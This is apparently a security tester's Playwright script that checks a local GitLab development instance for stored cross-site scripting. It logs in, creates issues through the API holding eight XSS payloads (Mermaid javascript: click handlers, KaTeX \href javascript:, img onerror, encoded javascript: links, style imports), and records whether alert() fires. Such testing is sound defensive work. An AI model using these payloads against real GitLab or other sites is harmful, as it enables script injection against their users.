"""
Playwright XSS verification for GitLab GDK
Tests Mermaid, KaTeX, and additional XSS vectors
Records video evidence
"""
import json
import os
import time
from playwright.sync_api import sync_playwright

GDK = "http://127.0.0.1:3000"
RESULTS = []


def log(msg):
    print(f"[*] {msg}")


def record_result(name, vuln, details):
    status = "VULNERABLE" if vuln else "SAFE"
    RESULTS.append({"name": name, "status": status, "details": details})
    marker = "!!!" if vuln else "   "
    print(f"  {marker} [{status}] {name}: {details}")


def login(page, username="attacker", password=os.environ.get("GDK_PASSWORD", "")):
    log(f"Logging in as {username}...")
    page.goto(f"{GDK}/users/sign_in")
    page.fill('input[name="user[login]"]', username)
    page.fill('input[name="user[password]"]', password)
    page.click('input[type="submit"], button[type="submit"]')
    page.wait_for_load_state("networkidle")
    if "/users/sign_in" in page.url:
        log("Login redirect detected, trying alternative...")
        page.goto(f"{GDK}/users/sign_in")
        page.fill("#user_login", username)
        page.fill("#user_password", password)
        page.click('[data-testid="sign-in-button"], input[name="commit"]')
        page.wait_for_load_state("networkidle")
    log(f"Current URL after login: {page.url}")


def test_xss_issue(page, issue_url, test_name, wait_time=5):
    """Visit an issue page and check for XSS execution."""
    alerts = []
    console_errors = []

    page.on("dialog", lambda dialog: (alerts.append(dialog.message), dialog.dismiss()))
    page.on("console", lambda msg: console_errors.append(msg.text) if msg.type == "error" else None)

    log(f"Testing {test_name}: {issue_url}")
    page.goto(issue_url)
    page.wait_for_load_state("networkidle")

    # Wait for client-side rendering (Mermaid, KaTeX)
    time.sleep(wait_time)

    # Scroll to trigger lazy rendering
    page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
    time.sleep(2)

    if alerts:
        record_result(test_name, True, f"XSS FIRED! alert() triggered with: {alerts}")
        return True
    else:
        record_result(test_name, False, "No alert() triggered")
        return False


def test_xss_via_js_check(page, issue_url, test_name, payload_marker):
    """Check if XSS payload survives in rendered DOM."""
    alerts = []
    page.on("dialog", lambda dialog: (alerts.append(dialog.message), dialog.dismiss()))

    log(f"Testing DOM presence {test_name}: {issue_url}")
    page.goto(issue_url)
    page.wait_for_load_state("networkidle")
    time.sleep(3)

    # Check DOM for unescaped payload
    dom_check = page.evaluate(f"""() => {{
        const html = document.body.innerHTML;
        const results = {{
            has_onerror: html.includes('onerror='),
            has_onload: html.includes('onload='),
            has_onclick: html.includes('onclick='),
            has_onmouseover: html.includes('onmouseover='),
            has_ontoggle: html.includes('ontoggle='),
            has_javascript_href: html.includes('href="javascript:'),
            has_javascript_colon: html.includes('javascript:alert'),
            has_data_text_html: html.includes('data:text/html'),
            has_eval: html.includes('eval('),
            // Check specifically in rendered content (not in JSON/script data)
            mermaid_divs: document.querySelectorAll('.mermaid svg').length,
            katex_spans: document.querySelectorAll('.katex').length,
            // Get all hrefs with javascript:
            js_hrefs: Array.from(document.querySelectorAll('a[href^="javascript:"]')).map(a => a.outerHTML),
            // Get any img with onerror
            img_onerror: Array.from(document.querySelectorAll('img[onerror]')).map(i => i.outerHTML),
            // Get any element with event handlers
            event_handlers: Array.from(document.querySelectorAll('[onload],[onerror],[onclick],[onmouseover],[ontoggle],[onfocus]')).map(e => e.outerHTML),
        }};
        return results;
    }}""")

    vuln = False
    details = []

    if dom_check.get("js_hrefs"):
        vuln = True
        details.append(f"javascript: hrefs found: {dom_check['js_hrefs'][:2]}")
    if dom_check.get("img_onerror"):
        vuln = True
        details.append(f"img onerror found: {dom_check['img_onerror'][:2]}")
    if dom_check.get("event_handlers"):
        vuln = True
        details.append(f"Event handlers in DOM: {dom_check['event_handlers'][:2]}")
    if alerts:
        vuln = True
        details.append(f"alert() triggered: {alerts}")

    if not details:
        details.append(f"Mermaid SVGs: {dom_check.get('mermaid_divs', 0)}, KaTeX: {dom_check.get('katex_spans', 0)}")
        details.append("No dangerous DOM elements found")

    record_result(test_name, vuln, "; ".join(details))
    return vuln


def create_additional_xss_issues(page):
    """Create more XSS test cases via the API using page context."""
    log("Creating additional XSS test issues via API...")

    payloads = [
        {
            "title": "XSS: Mermaid click handler",
            "description": '```mermaid\ngraph TD\n    click A "javascript:alert(document.domain)"\n    A["Click me"]\n```',
        },
        {
            "title": "XSS: Mermaid link",
            "description": '```mermaid\ngraph TD\n    A["test"] -->|"<script>alert(1)</script>"| B["end"]\n```',
        },
        {
            "title": "XSS: KaTeX url",
            "description": '$`\\url{javascript:alert(1)}`$\n\n$$\\href{javascript:alert(document.domain)}{Click}$$',
        },
        {
            "title": "XSS: Markdown image title",
            "description": '![x](http://example.com "onmouseover=alert(1)")',
        },
        {
            "title": "XSS: HTML injection in table",
            "description": '| Header |\n|---|\n| <img src=x onerror=alert(1)> |',
        },
        {
            "title": "XSS: Style tag",
            "description": '<style>@import "javascript:alert(1)";</style>\n<style>body{background:url("javascript:alert(1)")}</style>',
        },
        {
            "title": "XSS: Anchor with events",
            "description": '<a href="#" onclick="alert(1)">click</a>\n<a href="&#106;avascript:alert(1)">encoded</a>\n<a href="jav\tascript:alert(1)">tab</a>',
        },
        {
            "title": "XSS: Math block advanced",
            "description": '```math\n\\class{foo}{\\text{<img src=x onerror=alert(1)>}}\n```',
        },
    ]

    created = []
    for p in payloads:
        resp = page.evaluate(f"""async () => {{
            const resp = await fetch('{GDK}/api/v4/projects/21/issues', {{
                method: 'POST',
                headers: {{
                    'PRIVATE-TOKEN': 'glpat-attacker-token-00001',
                    'Content-Type': 'application/json'
                }},
                body: JSON.stringify({{
                    title: {json.dumps(p['title'])},
                    description: {json.dumps(p['description'])}
                }})
            }});
            return await resp.json();
        }}""")
        if resp.get("iid"):
            created.append({"iid": resp["iid"], "title": p["title"]})
            log(f"  Created issue #{resp['iid']}: {p['title']}")

    return created


def main():
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context(
            record_video_dir="./evidence/",
            record_video_size={"width": 1280, "height": 720},
            viewport={"width": 1280, "height": 720},
        )
        page = context.new_page()

        # Login
        login(page)

        # Test existing XSS issues
        log("\n=== TESTING EXISTING XSS ISSUES ===\n")

        test_xss_issue(page, f"{GDK}/attacker/xss-test/-/issues/21", "Mermaid XSS (onerror)", wait_time=8)
        test_xss_via_js_check(page, f"{GDK}/attacker/xss-test/-/issues/21", "Mermaid XSS DOM check", "onerror")

        test_xss_issue(page, f"{GDK}/attacker/xss-test/-/issues/20", "KaTeX XSS (href)", wait_time=8)
        test_xss_via_js_check(page, f"{GDK}/attacker/xss-test/-/issues/20", "KaTeX XSS DOM check", "javascript:")

        # Test the javascript: link issue
        test_xss_issue(page, f"{GDK}/attacker/xss-test/-/issues/16", "Markdown javascript: link", wait_time=5)
        test_xss_via_js_check(page, f"{GDK}/attacker/xss-test/-/issues/16", "Markdown javascript: DOM check", "javascript:")

        # Test data: URI
        test_xss_issue(page, f"{GDK}/attacker/xss-test/-/issues/17", "Data URI XSS", wait_time=5)

        # Test iframe
        test_xss_issue(page, f"{GDK}/attacker/xss-test/-/issues/19", "Iframe XSS", wait_time=5)

        # Test SVG onload
        test_xss_issue(page, f"{GDK}/attacker/xss-test/-/issues/22", "SVG onload XSS", wait_time=5)

        # Test details ontoggle
        test_xss_issue(page, f"{GDK}/attacker/xss-test/-/issues/23", "Details ontoggle XSS", wait_time=5)

        # Create and test additional payloads
        log("\n=== CREATING & TESTING ADDITIONAL XSS VECTORS ===\n")
        new_issues = create_additional_xss_issues(page)

        for issue in new_issues:
            url = f"{GDK}/attacker/xss-test/-/issues/{issue['iid']}"
            test_xss_issue(page, url, issue["title"], wait_time=8)
            test_xss_via_js_check(page, url, f"{issue['title']} (DOM)", "xss")

        # Check CSP in browser context
        log("\n=== CSP ANALYSIS ===\n")
        csp = page.evaluate("""() => {
            const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
            return meta ? meta.content : 'No meta CSP';
        }""")
        log(f"Meta CSP: {csp}")

        # Summary
        log("\n" + "=" * 60)
        log("SUMMARY")
        log("=" * 60)

        vulns = [r for r in RESULTS if r["status"] == "VULNERABLE"]
        safe = [r for r in RESULTS if r["status"] == "SAFE"]

        log(f"\nVulnerable: {len(vulns)}")
        for v in vulns:
            log(f"  !!! {v['name']}: {v['details']}")

        log(f"\nSafe: {len(safe)}")
        for s in safe:
            log(f"      {s['name']}")

        # Save results
        with open("./evidence/xss-results.json", "w") as f:
            json.dump(RESULTS, f, indent=2)
        log("\nResults saved to targets/gitlab/evidence/xss-results.json")

        context.close()
        browser.close()

        log(f"\nVideo recordings saved to targets/gitlab/evidence/")


if __name__ == "__main__":
    main()
